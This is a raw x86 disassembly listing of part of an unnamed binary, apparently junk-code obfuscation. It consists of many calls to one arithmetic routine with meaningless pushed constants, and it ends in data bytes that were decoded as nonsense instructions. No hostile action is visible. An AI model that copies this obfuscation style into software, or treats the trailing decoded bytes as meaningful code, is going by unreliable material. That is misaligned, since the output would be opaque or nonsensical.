  408157:	push   0xdf6e3700
  40815c:	call   0x408633
  408161:	add    esp,0x8
  408164:	push   0x23
  408166:	push   0xffffffe3
  408168:	push   0xef25d800
  40816d:	call   0x408633
  408172:	add    esp,0xc
  408175:	call   0x408633
  40817a:	push   0xdf3dde00
  40817f:	push   0xffffffc2
  408181:	push   0xed6c3600
  408186:	push   0xffffff9e
  408188:	call   0x408633
  40818d:	add    esp,0x10
  408190:	push   0x3f5c3600
  408195:	push   0x1be8400
  40819a:	call   0x408633
  40819f:	add    esp,0x8
  4081a2:	push   0x69c18500
  4081a7:	push   0x13
  4081a9:	push   0xffffff8d
  4081ab:	push   0xffffffcc
  4081ad:	push   0x7572c300
  4081b2:	call   0x408633
  4081b7:	add    esp,0x14
  4081ba:	push   0x1f
  4081bc:	push   0xffffffae
  4081be:	push   0x1f7bfa00
  4081c3:	push   0xc
  4081c5:	call   0x408633
  4081ca:	add    esp,0x10
  4081cd:	add    edi,eax
  4081cf:	push   0x7d891b00
  4081d4:	push   0x5
  4081d6:	call   0x408633
  4081db:	add    esp,0x8
  4081de:	push   0xffffffe0
  4081e0:	push   0x24
  4081e2:	call   0x408633
  4081e7:	add    esp,0x8
  4081ea:	call   0x408633
  4081ef:	push   0xffffffa2
  4081f1:	push   0xd9a4ec00
  4081f6:	call   0x408633
  4081fb:	add    esp,0x8
  4081fe:	push   0x8dd48000
  408203:	push   0xffffffff
  408205:	push   0x350b0100
  40820a:	call   0x408633
  40820f:	add    esp,0xc
  408212:	cmp    edi,0xaa4b
  408218:	je     0x4082a0
  40821e:	mov    eax,0x33
  408223:	push   0x11ddce00
  408228:	call   0x408633
  40822d:	add    esp,0x4
  408230:	test   eax,0x9e
  408235:	jne    0x4082a0
  408237:	mov    edx,0xaf
  40823c:	push   0xed54b400
  408241:	push   0xffffff9a
  408243:	push   0xffffff85
  408245:	push   0x19
  408247:	push   0x8dc41e00
  40824c:	call   0x408633
  408251:	add    esp,0x14
  408254:	mov    ecx,eax
  408256:	push   0xffffffc5
  408258:	call   0x408633
  40825d:	add    esp,0x4
  408260:	push   0xffffffb5
  408262:	push   0xcf0d5e00
  408267:	push   0xffffffce
  408269:	push   0xfffffff1
  40826b:	call   0x408633
  408270:	add    esp,0x10
  408273:	push   0xcd03ee00
  408278:	push   0x22
  40827a:	call   0x408633
  40827f:	add    esp,0x8
  408282:	push   0xd99d3000
  408287:	push   0x0
  408289:	call   0x408633
  40828e:	add    esp,0x8
  408291:	push   0xffffffed
  408293:	push   0x33
  408295:	call   0x408633
  40829a:	add    esp,0x8
  40829d:	mov    DWORD PTR [ebp-0x4],edi
  4082a0:	push   0x39fd2800
  4082a5:	push   0x5d
  4082a7:	push   0xed7ab100
  4082ac:	push   0x1f634100
  4082b1:	push   0xffffff98
  4082b3:	call   0x408633
  4082b8:	add    esp,0x14
  4082bb:	sub    eax,edi
  4082bd:	cmp    eax,edi
  4082bf:	jne    0x4082cb
  4082c1:	xor    edi,edi
  4082c3:	call   0x408633
  4082c8:	mov    DWORD PTR [ebp-0xc],edi
  4082cb:	push   0xfffffff7
  4082cd:	push   0x0
  4082cf:	push   0xffffffda
  4082d1:	push   0xffffffe6
  4082d3:	call   0x408633
  4082d8:	add    esp,0x10
  4082db:	call   0x408633
  4082e0:	push   0x1c
  4082e2:	push   0xf36fd00
  4082e7:	push   0x55
  4082e9:	call   0x408633
  4082ee:	add    esp,0xc
  4082f1:	push   0x67
  4082f3:	push   0x8f3ec600
  4082f8:	push   0x69
  4082fa:	call   0x408633
  4082ff:	add    esp,0xc
  408302:	pop    edi
  408303:	cmp    edi,DWORD PTR ds:0x434054
  408309:	je     0x40832f
  40830b:	test   edi,0x1f
  408311:	jne    0x40832f
  408313:	push   0x7f4aee00
  408318:	push   0xe9b5e400
  40831d:	push   0x29aaa500
  408322:	push   0x4f04f400
  408327:	call   0x408633
  40832c:	add    esp,0x10
  40832f:	push   0xffffffa0
  408331:	call   0x408633
  408336:	add    esp,0x4
  408339:	pop    esi
  40833a:	add    eax,esi
  40833c:	mov    DWORD PTR [ebp-0x28],eax
  40833f:	push   0xffffff90
  408341:	push   0xffffff9d
  408343:	push   0x30
  408345:	push   0xb50e4500
  40834a:	push   0x15
  40834c:	call   0x408633
  408351:	add    esp,0x14
  408354:	pop    ebx
  408355:	call   0x408633
  40835a:	push   0x23
  40835c:	push   0xf5b71900
  408361:	push   0xe19d5000
  408366:	push   0xffffffbd
  408368:	push   0xffffffe0
  40836a:	call   0x408633
  40836f:	add    esp,0x14
  408372:	leave  
  408373:	ret    
  408374:	int3   
  408375:	int3   
  408376:	int3   
  408377:	int3   
  408378:	int3   
  408379:	push   ebp
  40837a:	mov    ebp,esp
  40837c:	sub    esp,0x24
  40837f:	xor    ecx,ecx
  408381:	push   0x4b
  408383:	push   0x48
  408385:	push   0xffffffaa
  408387:	push   0x46
  408389:	call   0x408633
  40838e:	add    esp,0x10
  408391:	push   0x9ddff700
  408396:	call   0x408633
  40839b:	add    esp,0x4
  40839e:	push   ebx
  40839f:	test   eax,0x5d
  4083a4:	je     0x4083bb
  4083a6:	push   0xffffffc0
  4083a8:	push   0xffffffc4
  4083aa:	push   0x7e
  4083ac:	push   0x41
  4083ae:	push   0xdf53bf00
  4083b3:	call   0x408633
  4083b8:	add    esp,0x14
  4083bb:	push   0xffffffad
  4083bd:	push   0x22
  4083bf:	push   0xdd9d0800
  4083c4:	push   0xed219a00
  4083c9:	call   0x408633
  4083ce:	add    esp,0x10
  4083d1:	push   esi
  4083d2:	push   0xc1df6900
  4083d7:	push   0xffffffc5
  4083d9:	call   0x408633
  4083de:	add    esp,0x8
  4083e1:	push   edi
  4083e2:	add    eax,eax
  4083e4:	test   eax,0xe0
  4083e9:	je     0x408406
  4083eb:	add    eax,eax
  4083ed:	test   eax,0xba
  4083f2:	jne    0x408406
  4083f4:	push   0x45c9db00
  4083f9:	push   0x75654200
  4083fe:	call   0x408633
  408403:	add    esp,0x8
  408406:	mov    edi,0x91
  40840b:	mov    edx,0xed
  408410:	push   0xa1ec0400
  408415:	push   0x17
  408417:	call   0x408633
  40841c:	add    esp,0x8
  40841f:	and    edi,eax
  408421:	push   0x2
  408423:	push   0x9d827000
  408428:	push   0xffffffd2
  40842a:	push   0xfffffff1
  40842c:	push   0xc
  40842e:	call   0x408633
  408433:	add    esp,0x14
  408436:	push   0x4b
  408438:	call   0x408633
  40843d:	add    esp,0x4
  408440:	push   0xed5d4c00
  408445:	call   0x408633
  40844a:	add    esp,0x4
  40844d:	or     edi,eax
  40844f:	cmp    edi,DWORD PTR [ebp-0x18]
  408452:	jne    0x40857c
  408458:	test   edi,0xd9
  40845e:	je     0x40857c
  408464:	cmp    edi,0xfffffffe
  408467:	je     0x40857c
  40846d:	push   0xffffffa7
  40846f:	push   0x2def5100
  408474:	call   0x408633
  408479:	add    esp,0x8
  40847c:	push   0x19ce0f00
  408481:	push   0x31
  408483:	push   0xff07d900
  408488:	call   0x408633
  40848d:	add    esp,0xc
  408490:	mov    ebx,DWORD PTR ds:0x434074
  408496:	call   0x408633
  40849b:	cmp    edi,ebx
  40849d:	jne    0x40857c
  4084a3:	mov    edx,DWORD PTR ds:0x434074
  4084a9:	mov    eax,0x80
  4084ae:	push   0x50
  4084b0:	call   0x408633
  4084b5:	add    esp,0x4
  4084b8:	push   0x9195a800
  4084bd:	call   0x408633
  4084c2:	add    esp,0x4
  4084c5:	cmp    edi,DWORD PTR [ebp-0x10]
  4084c8:	jne    0x40857c
  4084ce:	mov    DWORD PTR [ebp-0x1c],edi
  4084d1:	push   0x35
  4084d3:	push   0xe99a1800
  4084d8:	call   0x408633
  4084dd:	add    esp,0x8
  4084e0:	or     ebx,eax
  4084e2:	or     ebx,edi
  4084e4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4084e7:	push   0xffffff97
  4084e9:	call   0x408633
  4084ee:	add    esp,0x4
  4084f1:	mov    edi,DWORD PTR ds:0x434048
  4084f7:	push   0x5f115900
  4084fc:	push   0xb
  4084fe:	call   0x408633
  408503:	add    esp,0x8
  408506:	push   0xd9a43800
  40850b:	push   0x69c9f400
  408510:	push   0xed26ba00
  408515:	push   0xade4d600
  40851a:	push   0xdbdaf00
  40851f:	call   0x408633
  408524:	add    esp,0x14
  408527:	and    DWORD PTR [ebp-0x1c],ebx
  40852a:	push   0x8dac5400
  40852f:	push   0xa99d3700
  408534:	push   0xcd02f700
  408539:	push   0x47
  40853b:	call   0x408633
  408540:	add    esp,0x10
  408543:	call   0x408633
  408548:	push   0x48
  40854a:	push   0xdd82500
  40854f:	push   0x7c
  408551:	push   0xffffffb7
  408553:	push   0xdc99200
  408558:	call   0x408633
  40855d:	add    esp,0x14
  408560:	push   0xffffffa3
  408562:	push   0x21
  408564:	call   0x408633
  408569:	add    esp,0x8
  40856c:	push   0x1badc00
  408571:	call   0x408633
  408576:	add    esp,0x4
  408579:	add    DWORD PTR [ebp-0x1c],edi
  40857c:	push   0xfffffff4
  40857e:	push   0x7d
  408580:	call   0x408633
  408585:	add    esp,0x8
  408588:	push   0x6c
  40858a:	push   0xffffffb2
  40858c:	push   0xfffffff6
  40858e:	push   0x34
  408590:	push   0xffffff97
  408592:	call   0x408633
  408597:	add    esp,0x14
  40859a:	push   0xb5d79600
  40859f:	call   0x408633
  4085a4:	add    esp,0x4
  4085a7:	push   0xf1f1f900
  4085ac:	push   0xffffff90
  4085ae:	call   0x408633
  4085b3:	add    esp,0x8
  4085b6:	push   0xb9afc700
  4085bb:	push   0x64
  4085bd:	push   0xffffffa5
  4085bf:	push   0xed74be00
  4085c4:	push   0x52
  4085c6:	call   0x408633
  4085cb:	add    esp,0x14
  4085ce:	pop    edi
  4085cf:	add    eax,eax
  4085d1:	push   0xffffff9a
  4085d3:	push   0xcd3c2d00
  4085d8:	push   0xb9a8d100
  4085dd:	call   0x408633
  4085e2:	add    esp,0xc
  4085e5:	push   0x63
  4085e7:	push   0x44
  4085e9:	push   0xffffffdd
  4085eb:	push   0x19
  4085ed:	call   0x408633
  4085f2:	add    esp,0x10
  4085f5:	pop    esi
  4085f6:	push   0xffffff99
  4085f8:	call   0x408633
  4085fd:	add    esp,0x4
  408600:	push   0x44
  408602:	call   0x408633
  408607:	add    esp,0x4
  40860a:	pop    ebx
  40860b:	mov    eax,0xf161
  408610:	push   0x62
  408612:	push   0xffffffae
  408614:	push   0xffffffce
  408616:	push   0xb
  408618:	push   0x37
  40861a:	call   0x408633
  40861f:	add    esp,0x14
  408622:	push   0x42
  408624:	call   0x408633
  408629:	add    esp,0x4
  40862c:	leave  
  40862d:	ret    
  40862e:	int3   
  40862f:	int3   
  408630:	int3   
  408631:	int3   
  408632:	int3   
  408633:	push   ebp
  408634:	mov    ebp,esp
  408636:	sub    esp,0x28
  408639:	xor    edx,edx
  40863b:	mov    eax,0xef
  408640:	mov    DWORD PTR [ebp-0x28],edx
  408643:	add    edx,eax
  408645:	add    eax,eax
  408647:	sub    eax,edx
  408649:	or     eax,edx
  40864b:	sub    eax,edx
  40864d:	sub    DWORD PTR [ebp-0x28],edx
  408650:	add    DWORD PTR [ebp-0x28],eax
  408653:	push   ebx
  408654:	mov    ecx,DWORD PTR [ebp-0x28]
  408657:	mov    edx,DWORD PTR [ebp-0x28]
  40865a:	test   ecx,0x7464
  408660:	jne    0x4086a4
  408662:	or     ecx,edx
  408664:	cmp    ecx,0x55
  408667:	je     0x4086a4
  408669:	add    ecx,ecx
  40866b:	mov    eax,0x6
  408670:	cmp    ecx,0x76
  408673:	jne    0x4086a4
  408675:	xor    edx,edx
  408677:	mov    ebx,0xdf7d
  40867c:	test   ecx,0xe2
  408682:	je     0x4086a4
  408684:	and    DWORD PTR [ebp-0x28],eax
  408687:	mov    DWORD PTR [ebp-0x28],edx
  40868a:	mov    eax,DWORD PTR [ebp-0x28]
  40868d:	mov    edx,DWORD PTR [ebp-0x28]
  408690:	sub    eax,ebx
  408692:	add    eax,ebx
  408694:	add    DWORD PTR [ebp-0x28],edx
  408697:	add    DWORD PTR [ebp-0x28],eax
  40869a:	cmp    edx,DWORD PTR [ebp-0x24]
  40869d:	jne    0x4086a4
  40869f:	or     ecx,edx
  4086a1:	add    DWORD PTR [ebp-0x28],ecx
  4086a4:	push   esi
  4086a5:	sub    ecx,ebx
  4086a7:	sub    ecx,eax
  4086a9:	or     ecx,eax
  4086ab:	mov    ebx,DWORD PTR [ebp-0x28]
  4086ae:	mov    esi,0xa2
  4086b3:	mov    DWORD PTR [ebp-0x28],esi
  4086b6:	xor    DWORD PTR [ebp-0x28],esi
  4086b9:	cmp    ecx,edx
  4086bb:	jne    0x4086da
  4086bd:	add    DWORD PTR [ebp-0x28],ecx
  4086c0:	test   ebx,0xd1
  4086c6:	je     0x4086da
  4086c8:	cmp    ebx,0x4
  4086cb:	je     0x4086da
  4086cd:	cmp    ebx,0x24
  4086d0:	je     0x4086da
  4086d2:	cmp    edx,0xffffffa3
  4086d5:	je     0x4086da
  4086d7:	add    DWORD PTR [ebp-0x28],ebx
  4086da:	push   edi
  4086db:	xor    ecx,ecx
  4086dd:	xor    DWORD PTR [ebp-0x28],ecx
  4086e0:	mov    esi,0x8e
  4086e5:	mov    ebx,eax
  4086e7:	mov    DWORD PTR [ebp-0x28],ebx
  4086ea:	mov    DWORD PTR [ebp-0x28],esi
  4086ed:	sub    edx,ebx
  4086ef:	mov    ebx,DWORD PTR [ebp-0x28]
  4086f2:	mov    DWORD PTR [ebp-0x28],edx
  4086f5:	cmp    ebx,ecx
  4086f7:	je     0x40871e
  4086f9:	mov    edx,0x73
  4086fe:	add    ebx,eax
  408700:	mov    eax,0xd602
  408705:	sub    ebx,esi
  408707:	test   ebx,0x8c
  40870d:	jne    0x408712
  40870f:	mov    DWORD PTR [ebp-0x28],ebx
  408712:	sub    edx,ecx
  408714:	add    DWORD PTR [ebp-0x28],edx
  408717:	add    eax,ecx
  408719:	add    edx,eax
  40871b:	sub    DWORD PTR [ebp-0x28],edx
  40871e:	mov    edi,DWORD PTR [ebp-0x28]
  408721:	mov    eax,DWORD PTR [ebp-0x28]
  408724:	cmp    eax,0x9a2b
  408729:	jne    0x40887c
  40872f:	xor    DWORD PTR [ebp-0x28],eax
  408732:	cmp    edi,0xffffffec
  408735:	jne    0x40887c
  40873b:	mov    ebx,0xda
  408740:	xor    edx,edx
  408742:	sub    ebx,edi
  408744:	xor    DWORD PTR [ebp-0x28],edx
  408747:	add    ebx,esi
  408749:	cmp    ebx,edx
  40874b:	je     0x40887c
  408751:	sub    DWORD PTR [ebp-0x28],edx
  408754:	test   eax,0x24
  408759:	je     0x40887c
  40875f:	sub    ebx,esi
  408761:	cmp    ebx,0x69501201
  408767:	jne    0x40887c
  40876d:	mov    edi,DWORD PTR [ebp-0x28]
  408770:	mov    ecx,DWORD PTR [ebp-0x28]
  408773:	cmp    ecx,eax
  408775:	jne    0x40887c
  40877b:	test   edi,0xad
  408781:	je     0x40887c
  408787:	mov    eax,ebx
  408789:	mov    esi,DWORD PTR [ebp-0x28]
  40878c:	cmp    esi,0x13
  40878f:	jne    0x40887c
  408795:	add    DWORD PTR [ebp-0x28],esi
  408798:	cmp    ecx,eax
  40879a:	jne    0x40887c
  4087a0:	cmp    edi,0x35
  4087a3:	jne    0x40887c
  4087a9:	add    DWORD PTR [ebp-0x28],edi
  4087ac:	add    eax,esi
  4087ae:	xor    edx,edx
  4087b0:	sub    ecx,eax
  4087b2:	mov    edi,DWORD PTR [ebp-0x28]
  4087b5:	sub    edx,esi
  4087b7:	add    DWORD PTR [ebp-0x28],eax
  4087ba:	add    DWORD PTR [ebp-0x28],ecx
  4087bd:	sub    edx,eax
  4087bf:	cmp    edx,ebx
  4087c1:	je     0x40887c
  4087c7:	add    DWORD PTR [ebp-0x28],ecx
  4087ca:	mov    esi,0xb4
  4087cf:	sub    edx,esi
  4087d1:	cmp    edx,DWORD PTR [ebp-0x14]
  4087d4:	je     0x40887c
  4087da:	mov    esi,DWORD PTR [ebp-0x28]
  4087dd:	or     edi,eax
  4087df:	mov    eax,DWORD PTR [ebp-0x28]
  4087e2:	and    esi,eax
  4087e4:	add    edi,esi
  4087e6:	cmp    edx,0xffffff82
  4087e9:	jne    0x40887c
  4087ef:	mov    ecx,0x4e
  4087f4:	mov    eax,ebx
  4087f6:	sub    DWORD PTR [ebp-0x28],eax
  4087f9:	add    DWORD PTR [ebp-0x28],ecx
  4087fc:	add    edi,ecx
  4087fe:	cmp    edi,DWORD PTR [ebp-0x10]
  408801:	jne    0x40887c
  408803:	mov    eax,0x4f45
  408808:	mov    ecx,DWORD PTR [ebp-0x28]
  40880b:	cmp    ecx,0xffffffdf
  40880e:	jne    0x40887c
  408810:	mov    esi,DWORD PTR [ebp-0x28]
  408813:	test   esi,0x9d
  408819:	jne    0x40887c
  40881b:	cmp    edx,0x7c
  40881e:	jne    0x40887c
  408820:	or     edi,edx
  408822:	add    DWORD PTR [ebp-0x28],esi
  408825:	xor    ebx,ebx
  408827:	cmp    ecx,0xffffff8f
  40882a:	jne    0x40887c
  40882c:	sub    ebx,edx
  40882e:	cmp    ebx,edx
  408830:	je     0x40887c
  408832:	mov    esi,DWORD PTR [ebp-0x28]
  408835:	sub    DWORD PTR [ebp-0x28],esi
  408838:	or     ebx,edx
  40883a:	mov    esi,DWORD PTR ds:0x434078
  408840:	cmp    ebx,0x56
  408843:	jne    0x40887c
  408845:	mov    edx,DWORD PTR [ebp-0x28]
  408848:	and    ecx,ebx
  40884a:	sub    edi,eax
  40884c:	xor    eax,eax
  40884e:	test   ecx,0xb542280a
  408854:	je     0x40887c
  408856:	mov    ebx,DWORD PTR [ebp-0x28]
  408859:	cmp    edx,DWORD PTR ds:0x434078
  40885f:	je     0x40887c
  408861:	cmp    ecx,esi
  408863:	je     0x40887c
  408865:	mov    eax,DWORD PTR [ebp-0x28]
  408868:	sub    DWORD PTR [ebp-0x28],edx
  40886b:	sub    ecx,ebx
  40886d:	xor    ebx,ebx
  40886f:	sub    eax,esi
  408871:	sub    DWORD PTR [ebp-0x28],edi
  408874:	sub    DWORD PTR [ebp-0x28],ecx
  408877:	add    eax,ebx
  408879:	mov    DWORD PTR [ebp-0x8],eax
  40887c:	xor    DWORD PTR [ebp-0x28],ecx
  40887f:	mov    edx,DWORD PTR [ebp-0x28]
  408882:	mov    ebx,eax
  408884:	add    DWORD PTR [ebp-0x28],ebx
  408887:	add    edx,ecx
  408889:	cmp    edx,ebx
  40888b:	je     0x408890
  40888d:	sub    DWORD PTR [ebp-0x28],edx
  408890:	pop    edi
  408891:	cmp    edx,DWORD PTR [ebp-0x10]
  408894:	jne    0x4088ac
  408896:	mov    edx,DWORD PTR [ebp-0x28]
  408899:	sub    edx,eax
  40889b:	add    DWORD PTR [ebp-0x28],edi
  40889e:	mov    ecx,edx
  4088a0:	and    ecx,eax
  4088a2:	cmp    ecx,0xffffff9a
  4088a5:	jne    0x4088ac
  4088a7:	sub    ecx,edi
  4088a9:	add    DWORD PTR [ebp-0x28],ecx
  4088ac:	pop    esi
  4088ad:	mov    ecx,DWORD PTR ds:0x434070
  4088b3:	mov    edx,DWORD PTR ds:0x434070
  4088b9:	and    edx,edi
  4088bb:	sub    edx,ecx
  4088bd:	sub    edx,ecx
  4088bf:	and    edx,eax
  4088c1:	add    edx,eax
  4088c3:	add    edx,edi
  4088c5:	cmp    esi,DWORD PTR [ebp-0x20]
  4088c8:	je     0x4088e5
  4088ca:	add    edx,edx
  4088cc:	mov    ecx,DWORD PTR [ebp-0x28]
  4088cf:	mov    ebx,DWORD PTR [ebp-0x28]
  4088d2:	xor    DWORD PTR [ebp-0x28],edx
  4088d5:	add    ebx,edx
  4088d7:	sub    DWORD PTR [ebp-0x28],ecx
  4088da:	and    ebx,esi
  4088dc:	and    ebx,esi
  4088de:	cmp    ebx,esi
  4088e0:	jne    0x4088e5
  4088e2:	add    DWORD PTR [ebp-0x28],ebx
  4088e5:	pop    ebx
  4088e6:	mov    edx,eax
  4088e8:	and    edx,ecx
  4088ea:	mov    eax,DWORD PTR [ebp-0x28]
  4088ed:	cmp    ebx,0x2d
  4088f0:	jne    0x40891e
  4088f2:	cmp    eax,DWORD PTR ds:0x434070
  4088f8:	je     0x40891e
  4088fa:	mov    ecx,DWORD PTR [ebp-0x28]
  4088fd:	sub    DWORD PTR [ebp-0x28],edx
  408900:	sub    ecx,ebx
  408902:	cmp    edi,eax
  408904:	jne    0x40891e
  408906:	mov    edx,DWORD PTR ds:0x434078
  40890c:	sub    edx,ebx
  40890e:	add    DWORD PTR [ebp-0x28],eax
  408911:	sub    edx,ecx
  408913:	sub    DWORD PTR [ebp-0x28],edi
  408916:	cmp    edx,DWORD PTR [ebp-0x8]
  408919:	jne    0x40891e
  40891b:	and    DWORD PTR [ebp-0x28],edx
  40891e:	leave  
  40891f:	ret    
  408920:	rol    DWORD PTR [ebx-0x148f87a4],0x1
  408927:	and    edi,DWORD PTR [edi]
  408929:	jae    0x4088cb
  40892b:	dec    eax
  40892c:	in     al,0xd5
  40892e:	push   edx
  40892f:	mov    ah,0x1d
  408931:	xor    al,0xc6
  408933:	sbb    eax,0xb0b09424
  408938:	retf   0x9783
  40893b:	pop    edx
  40893c:	mov    ebx,0xa4613294
  408941:	bswap  ebp
  408943:	out    dx,al
  408944:	mov    ds:0x53d42da1,eax
  408949:	imul   edi,DWORD PTR [edx],0xdf96c09e
  40894f:	mov    ah,0x73
  408951:	les    ebp,FWORD PTR [ecx]
  408953:	mov    al,bl
  408955:	xchg   esp,eax
  408956:	ret    
  408957:	test   al,al
  408959:	cmp    esp,edx
  40895b:	sbb    DWORD PTR [edi-0x34e49de4],ebp
  408961:	pop    ebp
  408962:	scas   eax,DWORD PTR es:[edi]
  408963:	not    DWORD PTR [ebx-0x51]
  408966:	gs sbb edx,edi
  408969:	fstp   QWORD PTR [edx]
  40896b:	outs   dx,DWORD PTR ds:[esi]
  40896c:	push   ebx
  40896d:	imul   edi,DWORD PTR [ecx+0x1b],0x8bd427b8
  408974:	scas   al,BYTE PTR es:[edi]
  408975:	cmp    eax,0x2575c915
  40897a:	fimul  DWORD PTR [ebp-0x4a2dc0ad]
  408980:	mov    bh,0x3e
  408982:	push   0x663eb7b7
  408987:	fdivr  DWORD PTR fs:[esi-0x61ec3b27]
  40898e:	xor    edx,ecx
  408990:	fcomp  st(7)
  408992:	jp     0x408972
  408994:	sbb    ebx,DWORD PTR [eax-0x7b6d184]
  40899a:	rcr    DWORD PTR [edx],cl
  40899c:	xchg   esp,eax
  40899d:	pushf  
  40899e:	mov    esp,ecx
  4089a0:	sbb    DWORD PTR [edx],edx
  4089a2:	mov    dh,0xc7
  4089a4:	push   ecx
  4089a5:	sub    edx,DWORD PTR [ebp-0x2b5cdd2f]
  4089ab:	sar    BYTE PTR [esi+0x49],cl
  4089ae:	in     al,0x41
  4089b0:	ss push 0xa44082bd
  4089b6:	pop    ebp
  4089b7:	add    esp,DWORD PTR [ebx]
  4089b9:	test   BYTE PTR [edx],ah
  4089bb:	cmc    
  4089bc:	or     bh,BYTE PTR [bx+0x5b17]
  4089c1:	imul   esi,DWORD PTR [edx],0xa2eb372c
  4089c7:	add    DWORD PTR [ebp+0x69],eax
  4089ca:	jns    0x408a44
  4089cc:	or     al,0x88
  4089ce:	outs   dx,BYTE PTR ds:[esi]
  4089cf:	sbb    al,BYTE PTR [ecx+ebp*2+0x66]
  4089d3:	sbb    edx,DWORD PTR [ebx+0x69]
  4089d6:	in     al,0x9a
  4089d8:	pop    ebx
  4089d9:	imul   ecx,DWORD PTR [eax+0x57],0x1b796aec
  4089e0:	fcom   DWORD PTR [edi+0x6b062c7e]
  4089e6:	js     0x408a03
  4089e8:	inc    esp
  4089e9:	push   ebx
  4089ea:	data16 sbb BYTE PTR [ebx+0x69],dl
  4089ee:	popf   
  4089ef:	fst    QWORD PTR [edx-0x56208fc5]
  4089f5:	nop
  4089f6:	fs iret 
  4089f8:	xor    edi,ebp
  4089fa:	jl     0x408a57
  4089fc:	mov    edi,0xcfa83e03
  408a01:	test   BYTE PTR [esi+0x1b],ah
  408a04:	push   ebx
  408a05:	mov    esp,0x6afe2d50
  408a0a:	js     0x408a27
  408a0c:	inc    esp
  408a0d:	jge    0x408a7a
  408a0f:	push   edi
  408a10:	inc    esp
  408a11:	imul   edx,ebx,0xffffff84
  408a14:	mov    ecx,0xb831336a
  408a19:	imul   edi,DWORD PTR [ecx+0x1b],0x1a6a87da
  408a20:	inc    esp
  408a21:	imul   eax,edx,0x79795e2c
  408a27:	sbb    edx,DWORD PTR [ebx-0x64]
  408a2a:	xor    al,0xad
  408a2c:	fdiv   DWORD PTR [edx+edi*2]
  408a2f:	sub    DWORD PTR cs:[esi+0x2c612e73],edi
  408a36:	mov    ch,0x85
  408a38:	xchg   ebp,eax
  408a39:	pushf  
  408a3a:	aam    0xc9
  408a3c:	(bad)  
  408a3d:	scas   eax,DWORD PTR es:[edi]
  408a3e:	jns    0x408a5a
  408a40:	inc    esp
  408a41:	imul   ebp,DWORD PTR [edi+0x79695219],0x5e963dae
  408a4b:	mov    dl,0xf6
  408a4d:	cs daa 
  408a4f:	xchg   DWORD PTR [ebp+0x2d],ecx
  408a52:	int3   
  408a53:	adc    BYTE PTR [ecx+0x7d],0x59
  408a57:	dec    esi
  408a58:	pop    ecx
  408a59:	test   eax,0x959ad2d5
  408a5e:	mov    dl,0xc
  408a60:	cmp    DWORD PTR [edi+0x69441993],ebx
  408a66:	jns    0x408a37
  408a68:	inc    ebp
  408a69:	test   DWORD PTR [ecx-0x27],edi
  408a6c:	mov    ebp,0x9d19dc47
  408a71:	mov    eax,ds:0x69441a76
  408a76:	sub    eax,0x79684752
  408a7b:	sbb    edi,DWORD PTR [esi+0x6b97fd57]
  408a81:	and    bl,0x1
  408a84:	inc    ebp
  408a85:	imul   edi,DWORD PTR [ecx-0x47],0x1a6e87d8
  408a8c:	inc    esp
  408a8d:	imul   edi,DWORD PTR [edi+0x32694f17],0xa6d5372c
  408a97:	jns    0x408a23
  408a99:	(bad)  
  408a9a:	jle    0x408a23
  408a9c:	cdq    
  408a9d:	pushf  
  408a9e:	retf   
  408a9f:	rcl    DWORD PTR [eax+0xc],1
  408aa2:	sub    ch,BYTE PTR [eax+ebp*4]
  408aa5:	xchg   ecx,eax
  408aa6:	gs jl  0x408b04
  408aa9:	pushf  
  408aaa:	aad    0xb9
  408aac:	push   eax
  408aad:	xchg   esi,eax
  408aae:	jle    0x408a76
  408ab0:	and    DWORD PTR [esi],ebp
  408ab2:	xor    eax,0x9a7bc0a1
  408ab7:	aam    0x8e
  408ab9:	add    edi,ebx
  408abb:	sbb    DWORD PTR [ebx+0x441ba2a1],esp
  408ac1:	imul   ebp,DWORD PTR [edi],0x65955792
  408ac7:	cdq    
  408ac8:	cmp    BYTE PTR [ecx+0x345037b6],ah
  408ace:	add    dl,dh
  408ad0:	sahf   
  408ad1:	add    DWORD PTR [eax+0x42],ecx
  408ad4:	push   ecx
  408ad5:	stos   BYTE PTR es:[edi],al
  408ad6:	pop    ecx
  408ad7:	(bad)  
  408ad8:	push   eax
  408ad9:	les    ecx,FWORD PTR [edx]
  408adb:	(bad)  
  408adc:	mov    es,WORD PTR [ecx]
  408ade:	cld    
  408adf:	sbb    DWORD PTR [eax-0x3a],edx
  408ae2:	jle    0x408b34
  408ae4:	(bad)  
  408ae5:	gs or  eax,0x7e451a78
  408aeb:	sbb    ebx,DWORD PTR [esi-0x41e4a564]
  408af1:	push   ds
  408af2:	js     0x408a79
  408af4:	pop    ebx
  408af5:	mov    eax,ds:0x69441881
  408afa:	mov    edi,0xf0654f50
  408aff:	xchg   ebp,eax
  408b00:	outs   dx,DWORD PTR ds:[esi]
  408b01:	add    DWORD PTR [edi-0x2c9ac2b],esp
  408b07:	or     eax,0x785a46d0
  408b0c:	cmp    ebp,DWORD PTR [edx+0x79]
  408b0f:	sbb    edx,DWORD PTR [ebx-0x16]
  408b12:	sbb    dh,bh
  408b14:	loope  0x408b8b
  408b16:	cmp    DWORD PTR [ecx],ebx
  408b18:	test   al,0x9e
  408b1a:	in     eax,0x1b
  408b1c:	bound  ebp,QWORD PTR [ecx]
  408b1e:	imul   di,WORD PTR [ebx],0xffcf
  408b22:	js     0x408b3f
  408b24:	inc    esp
  408b25:	and    DWORD PTR [ebx],0x1d
  408b28:	mov    ebx,0x7c7529b1
  408b2d:	push   0xf3b1dd3
  408b32:	jns    0x408b4f
  408b34:	inc    esp
  408b35:	and    DWORD PTR [ebx],0x1
  408b38:	mov    ebx,0x3c20f7dc
  408b3d:	imul   edx,ebx,0x79df3b1d
  408b43:	sbb    eax,DWORD PTR [ebx+eax*4+0x23]
  408b47:	add    eax,0xd76ac7d8
  408b4c:	xchg   ebx,eax
  408b4d:	sub    eax,0x75a34249
  408b52:	cli    
  408b53:	xchg   ebp,eax
  408b54:	push   ecx
  408b55:	jno    0x408b53
  408b57:	imul   edx,DWORD PTR [edi+0x4],0x37da1d32
  408b5e:	push   esi
  408b5f:	xlat   BYTE PTR ds:[ebx]
  408b60:	mov    ds:0x3762fe19,eax
  408b65:	popf   
  408b66:	jmp    0x408b75
  408b68:	fcom   DWORD PTR [edi-0x69c320aa]
  408b6e:	ret    
  408b6f:	dec    ebp
  408b70:	xchg   DWORD PTR [ecx+0xd800d2],esp
  408b76:	cli    
  408b77:	xchg   ebp,eax
  408b78:	add    DWORD PTR ds:0x974b922c,0x5a
  408b7f:	inc    ecx
  408b80:	jae    0x408beb
  408b82:	jns    0x408b9f
  408b84:	(bad)  
  408b85:	xor    BYTE PTR [ebx+0x6e],ch
  408b88:	lods   eax,DWORD PTR ds:[esi]
  408b89:	jmp    0x3962:0x955a8f2c
